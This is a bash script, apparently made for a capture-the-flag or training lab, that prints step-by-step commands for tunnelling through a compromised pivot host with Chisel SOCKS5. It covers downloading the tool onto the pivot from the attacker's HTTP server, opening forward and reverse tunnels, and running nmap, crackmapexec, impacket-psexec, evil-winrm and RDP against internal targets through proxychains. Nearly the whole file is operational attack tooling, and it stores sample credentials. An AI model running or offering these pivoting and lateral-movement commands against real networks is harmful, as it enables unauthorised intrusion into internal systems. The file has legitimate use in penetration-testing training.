#!/bin/bash

#═══════════════════════════════════════════════════════════════════════════════
#  CHISEL SOCKS5 TUNNEL - COMMAND GENERATOR & GUIDE
#  Generates commands for you to copy/paste - No auto-execution
#═══════════════════════════════════════════════════════════════════════════════

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'
DIM='\033[2m'

# Banner
print_banner() {
    clear
    echo -e "${CYAN}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════════╗
    ║      ____ _   _ ___ ____  _____ _                                 ║
    ║     / ___| | | |_ _/ ___|| ____| |                                ║
    ║    | |   | |_| || |\___ \|  _| | |                                ║
    ║    | |___|  _  || | ___) | |___| |___                             ║
    ║     \____|_| |_|___|____/|_____|_____|                            ║
    ║                                                                   ║
    ║           COMMAND GENERATOR & STEP-BY-STEP GUIDE                  ║
    ╚═══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

separator() {
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

header() {
    echo
    separator
    echo -e "${BOLD}${WHITE}  $1${NC}"
    separator
}

step() {
    echo -e "\n${YELLOW}╭─────────────────────────────────────────────────────────────────────────╮${NC}"
    echo -e "${YELLOW}│${NC} ${BOLD}${WHITE}STEP $1: $2${NC}"
    echo -e "${YELLOW}╰─────────────────────────────────────────────────────────────────────────╯${NC}"
}

cmd_box() {
    echo -e "${GREEN}┌─────────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${GREEN}│${NC} ${WHITE}$1${NC}"
    echo -e "${GREEN}└─────────────────────────────────────────────────────────────────────────┘${NC}"
}

note() {
    echo -e "${DIM}   ℹ️  $1${NC}"
}

where() {
    echo -e "${MAGENTA}   📍 Run on: ${BOLD}$1${NC}"
}

# Detect local IP
detect_ip() {
    for iface in tun0 tun1 tap0; do
        ip=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1)
        [[ -n "$ip" ]] && echo "$ip" && return
    done
    ip route get 1 2>/dev/null | grep -oP 'src \K\S+' | head -n1
}

# Get configuration
get_config() {
    header "CONFIGURATION"
    
    # Auto-detect IP
    DETECTED_IP=$(detect_ip)
    if [[ -n "$DETECTED_IP" ]]; then
        echo -e "${BLUE}[*]${NC} Detected IP: ${GREEN}$DETECTED_IP${NC}"
        read -rp "Use this IP? [Y/n]: " confirm
        if [[ "$confirm" =~ ^[Nn] ]]; then
            read -rp "Enter your attack host IP: " LOCAL_IP
        else
            LOCAL_IP="$DETECTED_IP"
        fi
    else
        read -rp "Enter your attack host IP: " LOCAL_IP
    fi
    
    echo
    echo -e "${CYAN}Pivot Host (the compromised host you have SSH access to):${NC}"
    read -rp "  Pivot Host IP: " PIVOT_IP
    read -rp "  SSH Username [ubuntu]: " PIVOT_USER
    PIVOT_USER=${PIVOT_USER:-ubuntu}
    read -rsp "  SSH Password: " PIVOT_PASS
    echo
    
    echo
    echo -e "${CYAN}Internal Target (the target behind the pivot, e.g., Domain Controller):${NC}"
    read -rp "  Internal Target IP [172.16.5.19]: " INTERNAL_IP
    INTERNAL_IP=${INTERNAL_IP:-172.16.5.19}
    read -rp "  RDP/SSH Username [victor]: " INTERNAL_USER
    INTERNAL_USER=${INTERNAL_USER:-victor}
    read -rsp "  RDP/SSH Password [pass@123]: " INTERNAL_PASS
    INTERNAL_PASS=${INTERNAL_PASS:-pass@123}
    echo
    
    echo
    echo -e "${CYAN}Tunnel Settings:${NC}"
    read -rp "  Chisel Port [1234]: " CHISEL_PORT
    CHISEL_PORT=${CHISEL_PORT:-1234}
    read -rp "  SOCKS5 Port [1080]: " SOCKS_PORT
    SOCKS_PORT=${SOCKS_PORT:-1080}
}

# Select mode
select_mode() {
    header "SELECT TUNNEL MODE"
    
    echo -e "${CYAN}Which tunnel mode do you need?${NC}"
    echo
    echo -e "  ${GREEN}1)${NC} ${BOLD}Forward Tunnel${NC} ${DIM}(Most common)${NC}"
    echo -e "     └─ Chisel SERVER on pivot, CLIENT on your machine"
    echo -e "     └─ Use when: You can connect TO the pivot"
    echo
    echo -e "  ${GREEN}2)${NC} ${BOLD}Reverse Tunnel${NC}"
    echo -e "     └─ Chisel SERVER on your machine, CLIENT on pivot"
    echo -e "     └─ Use when: Firewall blocks inbound to pivot"
    echo
    read -rp "Select [1/2]: " mode
    
    case $mode in
        2) TUNNEL_MODE="reverse" ;;
        *) TUNNEL_MODE="forward" ;;
    esac
}

# Generate Forward Tunnel Guide
generate_forward_guide() {
    print_banner
    header "FORWARD TUNNEL GUIDE"
    
    echo -e "${CYAN}"
    echo "  ┌──────────────┐         ┌──────────────┐         ┌──────────────┐"
    echo "  │ Attack Host  │────────▶│  Pivot Host  │────────▶│   Internal   │"
    echo "  │  (Client)    │         │   (Server)   │         │   Network    │"
    echo "  │ $LOCAL_IP    │         │ $PIVOT_IP    │         │ $INTERNAL_IP │"
    echo "  └──────────────┘         └──────────────┘         └──────────────┘"
    echo "        :$SOCKS_PORT ◀──────────── :$CHISEL_PORT"
    echo -e "${NC}"
    
    # Step 1
    step "1" "Get Chisel Binary"
    where "Attack Host"
    echo
    echo -e "${BOLD}Option A: Download pre-built binary (RECOMMENDED)${NC}"
    cmd_box "wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz"
    cmd_box "gunzip chisel_1.10.1_linux_amd64.gz"
    cmd_box "mv chisel_1.10.1_linux_amd64 chisel && chmod +x chisel"
    note "v1.10.1 is stable and works with most Go versions"
    note "Check latest: https://github.com/jpillora/chisel/releases"
    echo
    echo -e "${DIM}Option B: Use apt (if available)${NC}"
    cmd_box "sudo apt update && sudo apt install chisel -y"
    echo
    echo -e "${DIM}Option C: Build from source (requires Go 1.21+)${NC}"
    cmd_box "git clone https://github.com/jpillora/chisel.git"
    cmd_box "cd chisel"
    cmd_box "git checkout v1.10.1   # Use stable version"
    cmd_box "go build -ldflags='-s -w' -o chisel"
    note "If go.mod error: sed -i 's/go 1.25.1/go 1.21/' go.mod"
    
    # Step 2
    step "2" "Transfer Chisel to Pivot Host"
    where "Attack Host"
    echo
    echo -e "${DIM}Find your chisel binary first:${NC}"
    cmd_box "which chisel   # or: ls -la chisel"
    echo
    echo -e "${DIM}Option A: SCP (copy to home directory)${NC}"
    cmd_box "scp \$(which chisel) ${PIVOT_USER}@${PIVOT_IP}:/tmp/chisel"
    echo
    echo -e "${DIM}Option B: Start HTTP server and download${NC}"
    cmd_box "python3 -m http.server 8080"
    where "Pivot Host (after SSH)"
    cmd_box "wget http://${LOCAL_IP}:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel"
    echo
    echo -e "${DIM}Option C: Base64 transfer (if SCP fails)${NC}"
    cmd_box "base64 -w0 \$(which chisel) > /tmp/chisel.b64"
    note "Then copy/paste the base64 content to pivot and decode"
    
    # Step 3
    step "3" "SSH into Pivot Host"
    where "Attack Host"
    cmd_box "ssh ${PIVOT_USER}@${PIVOT_IP}"
    note "Password: ${PIVOT_PASS}"
    
    # Step 4
    step "4" "Start Chisel SERVER on Pivot"
    where "Pivot Host (inside SSH session)"
    cmd_box "./chisel server -v -p ${CHISEL_PORT} --socks5"
    echo
    echo -e "${DIM}Or run in background:${NC}"
    cmd_box "nohup ./chisel server -v -p ${CHISEL_PORT} --socks5 &"
    note "Wait for: 'Listening on http://0.0.0.0:${CHISEL_PORT}'"
    
    # Step 5
    step "5" "Start Chisel CLIENT on Attack Host"
    where "Attack Host (new terminal)"
    cmd_box "./chisel client -v ${PIVOT_IP}:${CHISEL_PORT} socks"
    echo
    echo -e "${DIM}Or with chisel from PATH:${NC}"
    cmd_box "chisel client -v ${PIVOT_IP}:${CHISEL_PORT} socks"
    note "Wait for: 'tun: proxy#127.0.0.1:${SOCKS_PORT}=>socks: Listening'"
    
    # Step 6
    step "6" "Configure Proxychains"
    where "Attack Host"
    echo
    echo -e "${DIM}Edit proxychains config:${NC}"
    cmd_box "sudo nano /etc/proxychains4.conf"
    echo
    echo -e "${DIM}Add/modify at the end of [ProxyList]:${NC}"
    echo -e "${WHITE}socks5 127.0.0.1 ${SOCKS_PORT}${NC}"
    echo
    echo -e "${DIM}Quick one-liner to add:${NC}"
    cmd_box "echo 'socks5 127.0.0.1 ${SOCKS_PORT}' | sudo tee -a /etc/proxychains4.conf"
}

# Generate Reverse Tunnel Guide
generate_reverse_guide() {
    print_banner
    header "REVERSE TUNNEL GUIDE"
    
    echo -e "${CYAN}"
    echo "  ┌──────────────┐         ┌──────────────┐         ┌──────────────┐"
    echo "  │ Attack Host  │◀────────│  Pivot Host  │────────▶│   Internal   │"
    echo "  │  (Server)    │         │   (Client)   │         │   Network    │"
    echo "  │ $LOCAL_IP    │         │ $PIVOT_IP    │         │ $INTERNAL_IP │"
    echo "  └──────────────┘         └──────────────┘         └──────────────┘"
    echo "        :${CHISEL_PORT} ◀────────────┘"
    echo "        :${SOCKS_PORT} (SOCKS5)"
    echo -e "${NC}"
    
    # Step 1 & 2 same as forward
    step "1" "Get Chisel Binary"
    where "Attack Host"
    echo
    echo -e "${BOLD}Download pre-built binary (RECOMMENDED):${NC}"
    cmd_box "wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz"
    cmd_box "gunzip chisel_1.10.1_linux_amd64.gz"
    cmd_box "mv chisel_1.10.1_linux_amd64 chisel && chmod +x chisel"
    note "Or: sudo apt install chisel"
    
    step "2" "Transfer Chisel to Pivot Host"
    where "Attack Host"
    cmd_box "python3 -m http.server 8080"
    where "Pivot Host"
    cmd_box "wget http://${LOCAL_IP}:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel"
    
    # Step 3 - Start SERVER on attack host
    step "3" "Start Chisel SERVER on Attack Host (with --reverse)"
    where "Attack Host"
    cmd_box "sudo ./chisel server --reverse -v -p ${CHISEL_PORT} --socks5"
    echo
    echo -e "${DIM}Or from PATH:${NC}"
    cmd_box "sudo chisel server --reverse -v -p ${CHISEL_PORT} --socks5"
    note "sudo needed for privileged port or to bind properly"
    note "Wait for: 'Reverse tunnelling enabled' and 'Listening on http://0.0.0.0:${CHISEL_PORT}'"
    
    # Step 4 - SSH and start client
    step "4" "SSH into Pivot Host"
    where "Attack Host (new terminal)"
    cmd_box "ssh ${PIVOT_USER}@${PIVOT_IP}"
    note "Password: ${PIVOT_PASS}"
    
    # Step 5 - Start client with R:socks
    step "5" "Start Chisel CLIENT on Pivot (with R:socks)"
    where "Pivot Host (inside SSH session)"
    cmd_box "./chisel client -v ${LOCAL_IP}:${CHISEL_PORT} R:socks"
    echo
    echo -e "${DIM}Or if in /tmp:${NC}"
    cmd_box "/tmp/chisel client -v ${LOCAL_IP}:${CHISEL_PORT} R:socks"
    note "The R: prefix tells chisel to reverse the tunnel"
    note "Wait for: 'Connected' message"
    
    # Step 6
    step "6" "Configure Proxychains"
    where "Attack Host"
    cmd_box "echo 'socks5 127.0.0.1 ${SOCKS_PORT}' | sudo tee -a /etc/proxychains4.conf"
}

# Generate usage commands
generate_usage() {
    header "NOW USE THE TUNNEL! 🚀"
    
    echo -e "${CYAN}Your SOCKS5 proxy is at: ${GREEN}127.0.0.1:${SOCKS_PORT}${NC}"
    echo
    
    step "7" "RDP to Internal Target (Get the flag!)"
    where "Attack Host"
    cmd_box "proxychains xfreerdp /v:${INTERNAL_IP} /u:${INTERNAL_USER} /p:'${INTERNAL_PASS}' /cert:ignore"
    echo
    echo -e "${DIM}Or with dynamic resolution:${NC}"
    cmd_box "proxychains xfreerdp /v:${INTERNAL_IP} /u:${INTERNAL_USER} /p:'${INTERNAL_PASS}' /cert:ignore /dynamic-resolution"
    
    header "OTHER USEFUL COMMANDS"
    
    echo -e "${YELLOW}SSH through tunnel:${NC}"
    cmd_box "proxychains ssh ${INTERNAL_USER}@${INTERNAL_IP}"
    echo
    
    echo -e "${YELLOW}Nmap through tunnel:${NC}"
    cmd_box "proxychains nmap -sT -Pn -p 21,22,80,445,3389 ${INTERNAL_IP}"
    note "Use -sT (TCP connect) - SYN scans don't work through SOCKS"
    echo
    
    echo -e "${YELLOW}SMB enumeration:${NC}"
    cmd_box "proxychains crackmapexec smb ${INTERNAL_IP} -u ${INTERNAL_USER} -p '${INTERNAL_PASS}'"
    echo
    
    echo -e "${YELLOW}Impacket tools:${NC}"
    cmd_box "proxychains impacket-psexec ${INTERNAL_USER}:'${INTERNAL_PASS}'@${INTERNAL_IP}"
    cmd_box "proxychains impacket-smbclient ${INTERNAL_USER}:'${INTERNAL_PASS}'@${INTERNAL_IP}"
    echo
    
    echo -e "${YELLOW}Web requests:${NC}"
    cmd_box "proxychains curl http://${INTERNAL_IP}"
    cmd_box "proxychains firefox http://${INTERNAL_IP}"
    echo
    
    echo -e "${YELLOW}Evil-WinRM:${NC}"
    cmd_box "proxychains evil-winrm -i ${INTERNAL_IP} -u ${INTERNAL_USER} -p '${INTERNAL_PASS}'"
}

# Save commands to file
save_commands() {
    SAVE_FILE="$HOME/chisel_commands_$(date +%Y%m%d_%H%M%S).txt"
    
    {
        echo "═══════════════════════════════════════════════════════════════════════════════"
        echo " CHISEL TUNNEL COMMANDS - Generated $(date)"
        echo "═══════════════════════════════════════════════════════════════════════════════"
        echo
        echo "CONFIGURATION:"
        echo "  Attack Host:    $LOCAL_IP"
        echo "  Pivot Host:     $PIVOT_IP ($PIVOT_USER)"
        echo "  Internal:       $INTERNAL_IP ($INTERNAL_USER)"
        echo "  Tunnel Mode:    ${TUNNEL_MODE^^}"
        echo "  Chisel Port:    $CHISEL_PORT"
        echo "  SOCKS5 Port:    $SOCKS_PORT"
        echo
        echo "═══════════════════════════════════════════════════════════════════════════════"
        echo
        
        if [[ "$TUNNEL_MODE" == "forward" ]]; then
            echo "FORWARD TUNNEL COMMANDS"
            echo "───────────────────────────────────────────────────────────────────────────────"
            echo
            echo "# 1. Transfer chisel to pivot (from attack host)"
            echo "scp \$(which chisel) ${PIVOT_USER}@${PIVOT_IP}:/tmp/chisel"
            echo "# Or via HTTP:"
            echo "# python3 -m http.server 8080"
            echo "# wget http://${LOCAL_IP}:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel"
            echo
            echo "# 2. SSH to pivot"
            echo "ssh ${PIVOT_USER}@${PIVOT_IP}"
            echo "# Password: ${PIVOT_PASS}"
            echo
            echo "# 3. Start server ON PIVOT:"
            echo "./chisel server -v -p ${CHISEL_PORT} --socks5"
            echo
            echo "# 4. Start client ON ATTACK HOST (new terminal):"
            echo "chisel client -v ${PIVOT_IP}:${CHISEL_PORT} socks"
            echo
        else
            echo "REVERSE TUNNEL COMMANDS"
            echo "───────────────────────────────────────────────────────────────────────────────"
            echo
            echo "# 1. Start server ON ATTACK HOST:"
            echo "sudo chisel server --reverse -v -p ${CHISEL_PORT} --socks5"
            echo
            echo "# 2. Transfer chisel to pivot and start client ON PIVOT:"
            echo "ssh ${PIVOT_USER}@${PIVOT_IP}"
            echo "/tmp/chisel client -v ${LOCAL_IP}:${CHISEL_PORT} R:socks"
            echo
        fi
        
        echo
        echo "═══════════════════════════════════════════════════════════════════════════════"
        echo "PROXYCHAINS SETUP"
        echo "───────────────────────────────────────────────────────────────────────────────"
        echo "echo 'socks5 127.0.0.1 ${SOCKS_PORT}' | sudo tee -a /etc/proxychains4.conf"
        echo
        echo "═══════════════════════════════════════════════════════════════════════════════"
        echo "USE THE TUNNEL"
        echo "───────────────────────────────────────────────────────────────────────────────"
        echo
        echo "# RDP to internal target:"
        echo "proxychains xfreerdp /v:${INTERNAL_IP} /u:${INTERNAL_USER} /p:'${INTERNAL_PASS}' /cert:ignore"
        echo
        echo "# SSH:"
        echo "proxychains ssh ${INTERNAL_USER}@${INTERNAL_IP}"
        echo
        echo "# Nmap:"
        echo "proxychains nmap -sT -Pn -p 22,80,445,3389 ${INTERNAL_IP}"
        echo
        echo "# SMB:"
        echo "proxychains crackmapexec smb ${INTERNAL_IP} -u ${INTERNAL_USER} -p '${INTERNAL_PASS}'"
        echo
        echo "═══════════════════════════════════════════════════════════════════════════════"
    } > "$SAVE_FILE"
    
    echo
    separator
    echo -e "${GREEN}[+]${NC} Commands saved to: ${WHITE}$SAVE_FILE${NC}"
    separator
}

# Show quick reference
quick_reference() {
    header "QUICK REFERENCE CARD"
    
    echo -e "${CYAN}┌───────────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│${NC} ${BOLD}FORWARD TUNNEL (Server on Pivot)${NC}                                        ${CYAN}│${NC}"
    echo -e "${CYAN}├───────────────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${CYAN}│${NC} ${DIM}Pivot:${NC}  ./chisel server -v -p ${CHISEL_PORT} --socks5                           ${CYAN}│${NC}"
    echo -e "${CYAN}│${NC} ${DIM}Attack:${NC} chisel client -v ${PIVOT_IP}:${CHISEL_PORT} socks                        ${CYAN}│${NC}"
    echo -e "${CYAN}├───────────────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${CYAN}│${NC} ${BOLD}REVERSE TUNNEL (Server on Attack Host)${NC}                                   ${CYAN}│${NC}"
    echo -e "${CYAN}├───────────────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${CYAN}│${NC} ${DIM}Attack:${NC} sudo chisel server --reverse -v -p ${CHISEL_PORT} --socks5              ${CYAN}│${NC}"
    echo -e "${CYAN}│${NC} ${DIM}Pivot:${NC}  ./chisel client -v ${LOCAL_IP}:${CHISEL_PORT} R:socks                    ${CYAN}│${NC}"
    echo -e "${CYAN}└───────────────────────────────────────────────────────────────────────────┘${NC}"
}

# Troubleshooting
show_troubleshooting() {
    header "TROUBLESHOOTING"
    
    echo -e "${YELLOW}Go build fails with 'invalid go version 1.25.1':${NC}"
    echo "  └─ The latest chisel requires unreleased Go version"
    echo "  └─ Fix: Use an older stable release:"
    echo "     git checkout v1.10.1"
    echo "     go build"
    echo "  └─ Or just download pre-built binary (recommended)"
    echo
    
    echo -e "${YELLOW}wget wildcard doesn't work:${NC}"
    echo "  └─ Use exact version URL:"
    echo "     wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz"
    echo
    
    echo -e "${YELLOW}SCP fails with 'Failure':${NC}"
    echo "  └─ Target directory may be read-only. Try: scp chisel user@host:/tmp/chisel"
    echo "  └─ Or use HTTP transfer method instead"
    echo
    
    echo -e "${YELLOW}Chisel version mismatch:${NC}"
    echo "  └─ Use same chisel version on both hosts"
    echo "  └─ Download pre-built from: https://github.com/jpillora/chisel/releases"
    echo
    
    echo -e "${YELLOW}Connection refused on client:${NC}"
    echo "  └─ Check if server is running: ss -tlnp | grep ${CHISEL_PORT}"
    echo "  └─ Check firewall: sudo ufw status"
    echo
    
    echo -e "${YELLOW}Proxychains timeout:${NC}"
    echo "  └─ Verify SOCKS port: ss -tlnp | grep ${SOCKS_PORT}"
    echo "  └─ Check proxychains config has correct port"
    echo
    
    echo -e "${YELLOW}RDP black screen:${NC}"
    echo "  └─ Add /dynamic-resolution to xfreerdp command"
    echo "  └─ Try /sec:tls or /sec:nla"
}

# Main menu
main_menu() {
    while true; do
        echo
        separator
        echo -e "${BOLD}${WHITE}  WHAT WOULD YOU LIKE TO DO?${NC}"
        separator
        echo -e "  ${GREEN}1)${NC} Show step-by-step guide again"
        echo -e "  ${GREEN}2)${NC} Show usage commands (RDP, SSH, etc.)"
        echo -e "  ${GREEN}3)${NC} Show quick reference card"
        echo -e "  ${GREEN}4)${NC} Show troubleshooting tips"
        echo -e "  ${GREEN}5)${NC} Save all commands to file"
        echo -e "  ${GREEN}6)${NC} Start over with new config"
        echo -e "  ${GREEN}q)${NC} Quit"
        echo
        read -rp "Select: " choice
        
        case $choice in
            1)
                if [[ "$TUNNEL_MODE" == "reverse" ]]; then
                    generate_reverse_guide
                else
                    generate_forward_guide
                fi
                ;;
            2) generate_usage ;;
            3) quick_reference ;;
            4) show_troubleshooting ;;
            5) save_commands ;;
            6) main ;;
            q|Q) echo -e "\n${GREEN}Good luck with your tunnel! 🚀${NC}\n"; exit 0 ;;
            *) echo -e "${RED}Invalid option${NC}" ;;
        esac
    done
}

# Main
main() {
    print_banner
    get_config
    select_mode
    
    if [[ "$TUNNEL_MODE" == "reverse" ]]; then
        generate_reverse_guide
    else
        generate_forward_guide
    fi
    
    generate_usage
    quick_reference
    main_menu
}

main "$@"
